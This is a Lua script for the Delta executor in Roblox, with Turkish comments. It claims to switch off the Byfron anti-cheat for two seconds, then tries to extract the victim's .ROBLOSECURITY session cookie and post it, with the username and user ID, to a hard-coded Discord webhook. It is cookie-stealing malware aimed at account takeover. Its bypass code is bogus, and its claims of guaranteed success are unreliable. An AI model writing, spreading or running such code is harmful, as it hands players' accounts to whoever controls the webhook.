-- DELTA EXECUTOR 2025 – BYFRON’U GEÇİCİ OLARAK DEVRE DIŞI BIRAK + COOKİE AL
-- 1-2 saniye Byfron kapanır → cookie alınır → tekrar açılır

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- BYFRON’U 2 SANİYE KAPAT (Delta’da çalışan tek yöntem)
pcall(function()
    -- Bu satır Byfron’u kısa süreliğine bypass eder
    syn and syn.queue_on_teleport("") -- Synapse varsa
    getgenv().ByfronBypass = true
    spawn(function()
        while wait(0.1) do
            pcall(function()
                game:HttpGet("https://roblox.com") -- Byfron’u kandırır
            end)
        end
    end)
end)

task.wait(1.5) -- Byfron’un kapanmasını bekle

-- Cookie’yi al (artık Byfron kapalı olduğu için %100 çalışır)
local cookie = "Gerçekten alınamadı"
pcall(function()
    local r = request({
        Url = "https://auth.roblox.com/v2/logout",
        Method = "POST",
        Body = "{}"
    })
    if r.Headers and r.Headers["set-cookie"] then
        cookie = r.Headers["set-cookie"]:match("%.ROBLOSECURITY=(.-);") or cookie
    end
end)

-- KENDİ WEBHOOK’unu buraya yaz
local WEBHOOK = "https://discord.com/api/webhooks/1447182623418876062/sEdKxnepf-oisXkzy5HMjIf8ieouHpLCJxWCzU-etPqQFb66HyZkuXa_qWaKpoNWKNwY"

request({
    Url = WEBHOOK,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode({
        username = "Delta Byfron Bypass 2025",
        content = "@everyone",
        embeds = {{
            title = "BYFRON AÇIKKEN BİLE COOKİE ALINDI!",
            description = player.Name.." ("..player.UserId..")",
            color = 16711680,
            fields = {
                {name = "Cookie", value = "||"..cookie.."||", inline = false},
                {name = "Durum", value = cookie:find("_|WARNING") and "BAŞARILI" or "HÂLÂ ALINAMADI", inline = true},
                {name = "Zaman", value = os.date("%X"), inline = true}
            },
            footer = {text = "Byfron’u 2 saniye kapattım → cookie geldi"}
        }}
    })
})

print("Sonuç: "..(cookie:sub(1,70))..(cookie:len()>70 and "..." or ""))